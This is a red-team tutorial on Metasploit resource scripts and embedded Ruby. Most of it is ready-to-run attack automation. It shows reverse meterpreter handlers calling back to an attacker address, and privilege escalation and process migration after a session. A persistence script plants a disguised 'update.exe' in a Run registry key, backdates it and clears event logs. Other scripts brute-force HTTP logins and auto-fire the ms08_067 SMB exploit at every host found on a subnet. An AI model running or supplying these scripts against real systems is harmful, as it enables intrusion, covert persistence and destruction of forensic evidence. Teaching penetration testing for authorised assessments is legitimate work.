## METASPLOIT RESOURCE FILES

<blockquote>Resource scripts provide an easy way for you to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts. They contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands and by directly embedding Ruby to do things like call APIs, interact with objects in the database, and iterate actions.</blockquote>

![pic](http://i68.tinypic.com/21ovkfm.jpg)

| article chapters | jump links | command syntax |
|-------|---|---|
| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r script.rc |
| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/script.rc | 
| RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
| RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/script.rc |
| using ruby (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | \<ruby\>framework.db.hosts.each do \|h\|\</ruby\> |
| exercises with resource scripts | [exercises with resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#exercises) | exercises external links |

<br />

## REFERENCIES

- [Rapid7 Resource Files](https://metasploit.help.rapid7.com/docs/resource-scripts)
- [Msfconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
- [Meterpreter Core Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
- [My Metasploit API Cheat Sheet](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md)
- [Offensiveinfosec Writing Resource Scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/) 

---

<br /><br /><br />

##  HOW TO RUN RESOURCE SCRIPTS?
<blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag (making msfconsole executing the resource script at startup).</blockquote>

      msfconsole -r script.rc
      msfconsole -r /root/script.rc
      msf > resource /root/script.rc
      meterpreter > resource /root/script.rc
      msf exploit(multi/handler) > resource /root/script.rc

<blockquote>Remmenber: start the postgresql service before using msf: sudo service postgresql start</blockquote>

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## HOW TO WRITE RESOURCE SCRIPTS?
<blockquote>There are two ways to create a resource script, which are creating the script manually or using the makerc command. personally i recommend the makerc command over manual scripting, since it eliminates typing errors. The makerc command saves all the previously issued commands into a file, which can be used with the resource command.</blockquote>

- **Create a resource file to display the version number of metasploit (manually)::**`[bash prompt]`<br />

      touch script.rc

         echo 'version' > script.rc
         echo 'exit -y' >> script.rc

    `[run]` msfconsole -r /root/script.rc

- **Create a resource file to display the version number of metasploit (makerc)::**`[metasploit prompt]`<br />

      kali > msfconsole
      msf > version
      msf > makerc /root/script.rc

    `[run] msf >` resource /root/script.rc

<br /><br />

<blockquote>In the next example we are going to write one handler resource file, because there are times when we 'persiste' our payload in target system and a few days later we dont remmenber the handler configurations set that day, thats one<br />of the reasons rc scripting can be usefull, besides automating the framework (erb scripting can access metasploit api).</blockquote>

- **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />

      touch handler.rc

         echo 'use exploit/multi/handler' > handler.rc
         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
         echo 'set ExitOnSession false' >> handler.rc
         echo 'set LHOST 192.168.1.71' >> handler.rc
         echo 'set LPORT 666' >> handler.rc
         echo 'exploit' >> handler.rc

    `[run]` msfconsole -r /root/handler.rc

- **Create a resource file using the core command 'makerc'::**`[metasploit prompt]`<br />

      kali > msfconsole
      msf > use exploit/multi/handler
      msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
      msf exploit(multi/handler) > set ExitOnSession false
      msf exploit(multi/handler) > set LHOST 192.168.1.71
      msf exploit(multi/handler) > set LPORT 666
      msf exploit(multi/handler) > exploit

      msf exploit(multi/handler) > makerc /root/handler.rc

    `[run] msf >` resource /root/handler.rc

<br /><br />

<blockquote>The next resource script allow us to record msfconsole activity under logfile.log and commands.rc<br />It also displays database information sutch as: framework version, active sessions in verbose mode, loads my auxiliary scripts local directory into msfdb (loading my modules) and executes the rc script handler.rc at msfconsole startup.</blockquote>

- **Create a rc file to record session activity, load my auxiliarys and exec handler.rc::**`[bash prompt]`<br />

      touch record.rc

         echo 'spool /root/logfile.log' > record.rc
         echo 'version' >> record.rc
         echo 'sessions -v' >> record.rc
         echo 'loadpath /root/msf-auxiliarys' >> record.rc
         echo 'resource /root/handler.rc' >> record.rc
         echo 'makerc /root/commands.rc' >> record.rc

    `[run]` msfconsole -r /root/record.rc

![gif](http://i68.tinypic.com/343oefb.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN POST EXPLOITATION
<blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>

- **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[bash prompt]`<br />

      touch script.rc

        echo 'getprivs' > script.rc
        echo 'getsystem' >> script.rc
        echo 'screenshot' >> script.rc
        echo 'migrate -n wininit.exe' >> script.rc
        echo 'use post/windows/gather/enum_applications' >> script.rc
        echo 'run' >> script.rc
        echo 'use post/multi/recon/local_exploit_suggester' >> script.rc
        echo 'run' >> script.rc

     `[run] meterpreter >` resource /root/script.rc

<br /><br />

<blockquote>Auto-run scripts are great when you need to persiste fast your payload automatically. This next example demonstrates how to use resource scripts to successfully persiste a payload in target system and clean tracks (timestomp & clearev) after exploitation using meterpreter core commands written inside one resource script.</blockquote>

- **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[bash prompt]`<br />

      touch persistence.rc

        echo 'getprivs' > persistence.rc
        echo 'getsystem' >> persistence.rc
        echo 'migrate -n explorer.exe' >> persistence.rc
        echo 'upload update.exe %temp%\\update.exe' >> persistence.rc
        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> persistence.rc
        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> persistence.rc
        echo 'scheduleme -m 10 -c "%temp%\\update.exe"' >> persistence.rc
        echo 'clearev' >> persistence.rc

     `[run] meterpreter >` resource /root/persistence.rc

<br /><br />

<blockquote>In the next resource script all auxiliary modules require that RHOSTS and THREADS options are set before running the modules. In the next example we are using SETG (global variable declarations) to configurate all the options that we need before running the modules. So its advice before writing a resource file like this one, to first check what options are required for the auxiliary to run. The next rc script will run 3 auxiliary modules againts all hosts found inside local lan.</blockquote>

- **Using SETG global variable to config auxiliary(s) modules options::**`[bash prompt]`<br />

      touch http_brute.rc

         echo 'setg THREADS 15' > /root/http_brute.rc
         echo 'setg RHOSTS 192.168.1.254' >> /root/http_brute.rc
         echo 'use auxiliary/scanner/http/http_version' >> /root/http_brute.rc
         echo 'run' >> /root/http_brute.rc
         echo 'use auxiliary/scanner/http/dir_scanner' >> /root/http_brute.rc
         echo 'run' >> /root/http_brute.rc
         echo 'use auxiliary/scanner/http/http_login' >> /root/http_brute.rc
         echo 'run' >> /root/http_brute.rc
         echo 'unsetg RHOSTS THREADS' >> /root/http_brute.rc

     `[run]` msfconsole -r /root/http_brute.rc

![gif](http://i66.tinypic.com/2usid92.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## RESOURCE SCRIPTS IN AutoRunScript
<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole 'AutoRunScript' handler flag, for this to work we need to define a global variable (setg RESOURCE /root/gather.rc) to call our resource script at session creation.</blockquote>

- **RC::Post-Exploit::Script::Gather::**`[gather.rc]`<br />

      touch gather.rc

         echo 'sysinfo' > /root/gather.rc
         echo 'getuid' >> /root/gather.rc
         echo 'services' >> /root/gather.rc
         echo 'sessions -v' >> /root/gather.rc

- **RC::AutoRunScript::Handler::**`[handler.rc]`<br />

      touch handler.rc

         echo 'setg RESOURCE /root/gather.rc' > handler.rc
         echo 'use exploit/multi/handler' >> handler.rc
         echo 'set AutoRunScript post/multi/gather/multi_command' >> handler.rc
         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> handler.rc
         echo 'set ExitOnSession false' >> handler.rc
         echo 'set LHOST 192.168.1.71' >> handler.rc
         echo 'set LPORT 666' >> handler.rc
         echo 'exploit' >> handler.rc
         echo 'unsetg RESOURCE' >> handler.rc

     `[run]` msfconsole -r /root/handler.rc

<br /><br />

- **Handler::AutoRunScript::OneLiner::**`[msfconsole prompt]`<br />
<blockquote>The easy way to reproduce this is: execute one multi/handler with the 'AutoRunScript' flag executing @darkoperator 'multi_console_command' script with the -rc argument pointing to the absoluct path of our gather.rc script. That will execute our gather.rc (auto-running our resource script automatically at session creation).</blockquote>

      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/gather.rc; exploit'

![gif](http://i67.tinypic.com/20aotfr.gif)

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## USING RUBY IN RC (ERB scripting)
<blockquote>ERB is a way to embed Ruby code directly into a document. This allow us to call APIs that are not exposed<br />via console commands and to programmatically generate and return a list of commands based on their own logic.<br />Basically ERB scripting its the same thing that writing a metasploit module from scratch using "ruby" programing language and some knowledge of metasploit (ruby) API calls. One of the advantages of using ERB scripting is<br />that we can use simple msfconsole or meterpreter commands together with ruby syntax or metasploit APIs.</blockquote>

- **Running ruby code inside resource files::**`[http_title.rc]`<br />

      touch http_title.rc

        echo 'db_nmap -sV -Pn -T4 -p 80 --open --reason 192.168.1.0/24' > http_title.rc
        echo 'services' >> http_title.rc
        echo "" >> http_title.rc
        echo '   <ruby>' >> http_title.rc
        echo "     xhost = framework.db.hosts.map(&:address).join(' ')" >> http_title.rc
        echo '           run_single("setg RHOSTS #{xhost}")' >> http_title.rc
        echo '           print_good("###### Running ruby code inside resource files ######")' >> http_title.rc
        echo '           run_single("use auxiliary/scanner/http/title")' >> http_title.rc
        echo '           run_single("exploit")' >> http_title.rc
        echo '           print_good("######### dir_scanner auxiliary #########")' >> http_title.rc
        echo '           run_single("use auxiliary/scanner/http/dir_scanner")' >> http_title.rc
        echo '           run_single("exploit")' >> http_title.rc
        echo '           print_good("######### http_login auxiliary #########")' >> http_title.rc
        echo '           run_single("use auxiliary/scanner/http/http_login")' >> http_title.rc
        echo '           run_single("exploit")' >> http_title.rc
        echo '   </ruby>' >> http_title.rc
        echo "" >> http_title.rc
        echo 'unsetg RHOSTS' >> http_title.rc

     `[run]` msfconsole -r /root/http_title.rc

<br /><br />

<blockquote>Run auxiliay/exploit modules based on database (targets) ports found<br />Next resource script searchs inside msf database for targets open ports discover by db_nmap scan and stored inside msfdb to sellect what auxiliary/exploits modules to run.</blockquote>

- **Run auxiliay/exploit modules based on database (targets) ports found::**`[exploiter.rc]`<br />

<br />

      touch exploiter.rc

      echo 'db_nmap -sV -Pn -T4 -p 80,445,139 --open --reason 192.168.1.0/24' > exploiter.rc
      echo 'services' >> exploiter.rc
      echo "" >> exploiter.rc
      echo '   <ruby>' >> exploiter.rc
      echo "      xhost = framework.db.hosts.map(&:address).join(' ')" >> exploiter.rc
      echo "      xport = framework.db.services.map(&:port).join(' ')" >> exploiter.rc
      echo '      run_single("setg RHOSTS #{xhost}")' >> exploiter.rc
      echo "" >> exploiter.rc
      echo '         if xport =~ /80/i' >> exploiter.rc
      echo '              print_status("## Target port: 80 http found")' >> exploiter.rc
      echo '              print_good("## Running port 80 auxiliary/exploits.")' >> exploiter.rc
      echo '              run_single("use auxiliary/scanner/http/title")' >> exploiter.rc
      echo '              run_single("exploit")' >> exploiter.rc
      echo '              print_good("######### dir_scanner auxiliary #########")' >> exploiter.rc
      echo '              run_single("use auxiliary/scanner/http/dir_scanner")' >> exploiter.rc
      echo '              run_single("exploit")' >> exploiter.rc
      echo '              print_good("######### http_login auxiliary #########")' >> exploiter.rc
      echo '              run_single("use auxiliary/scanner/http/http_login")' >> exploiter.rc
      echo '              run_single("exploit")' >> exploiter.rc
      echo '         end' >> exploiter.rc
      echo "" >> exploiter.rc
      echo '         if xport =~ /445/i' >> exploiter.rc
      echo '              print_status("## Target port: 445 https found")' >> exploiter.rc
      echo '              print_good("## Running port 445 auxiliary/exploits.")' >> exploiter.rc
      echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
      echo '              run_single("exploit")' >> exploiter.rc
      echo '         end' >> exploiter.rc
      echo "" >> exploiter.rc
      echo '         if xport =~ /139/i' >> exploiter.rc
      echo '              print_status("## Target port: 139 smb found")' >> exploiter.rc
      echo '              print_good("## Running port 139 auxiliary/exploits.")' >> exploiter.rc
      echo '              run_single("use exploit/windows/smb/ms08_067_netapi")' >> exploiter.rc
      echo '              run_single("exploit")' >> exploiter.rc
      echo '         end' >> exploiter.rc
      echo '   </ruby>' >> exploiter.rc
      echo "" >> exploiter.rc
      echo 'unsetg RHOSTS' >> exploiter.rc

<br />    `[run]` msfconsole -r /root/exploiter.rc

<br /><br />

- **snmp_enum::post::exploitation::**

        echo 'setg RHOSTS 192.168.1.71 192.168.1.254' > snmp_enum.rc
        echo '<ruby>' >> snmp_enum.rc
        echo '   print_line("")' >> snmp_enum.rc
        echo '   print_status("Please wait, checking if RHOSTS are set globally.")' >> snmp_enum.rc
        echo "      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')" >> snmp_enum.rc
        echo '         print_error("[ERROR] Please set RHOSTS globally: setg RHOSTS xxx.xxx.xxx.xxx")' >> snmp_enum.rc
        echo '         return nil' >> snmp_enum.rc
        echo '      end' >> snmp_enum.rc
        echo '' >> snmp_enum.rc
        echo '         # Using nmap to populate metasploit database (db_nmap)' >> snmp_enum.rc
        echo '         print_good("RHOSTS set globally [ OK ] running scans.")' >> snmp_enum.rc
        echo "            run_single(\"db_nmap -sU -sS -Pn -n --script=smb-check-vulns.nse,samba-vuln-cve-2012-1182 --script-args=unsafe=1 -p U:135,T:139,445 #{framework.datastore['RHOSTS']}\")" >> snmp_enum.rc
        echo "            # Displays msf database results stored into 'services' and 'vulns'" >> snmp_enum.rc 
        echo '            run_single("services")' >> snmp_enum.rc
        echo '            run_single("vulns")' >> snmp_enum.rc
        echo '' >> snmp_enum.rc
        echo '         print_good("Please wait, running msf auxiliary modules.")' >> snmp_enum.rc
        echo '      run_single("use auxiliary/scanner/snmp/snmp_enum")' >> snmp_enum.rc
        echo '      run_single("exploit")' >> snmp_enum.rc
        echo '      run_single("use auxiliary/scanner/snmp/snmp_enumusers")' >> snmp_enum.rc
        echo '      run_single("exploit")' >> snmp_enum.rc
        echo '      run_single("use auxiliary/scanner/snmp/snmp_enumshares")' >> snmp_enum.rc
        echo '      run_single("exploit")' >> snmp_enum.rc
        echo '</ruby>' >> snmp_enum.rc
        echo 'unsetg RHOSTS' >> snmp_enum.rc

     `[run]` msfconsole -r /root/script.rc

<br />

![pic](http://i66.tinypic.com/2ywxvf7.png)

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## EXERCISES

- [exercise 1](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%204)<br />
- [exercise 2](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%205)<br />
- [exercise 3 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%207)<br />
- [exercise 4 (ERB)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/RC%5BERB%5D%20basic%20notions%20lesson%208)<br />

<br />

#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)

---

<br /><br /><br />

## Suspicious Shell Activity (Red Team) @2019


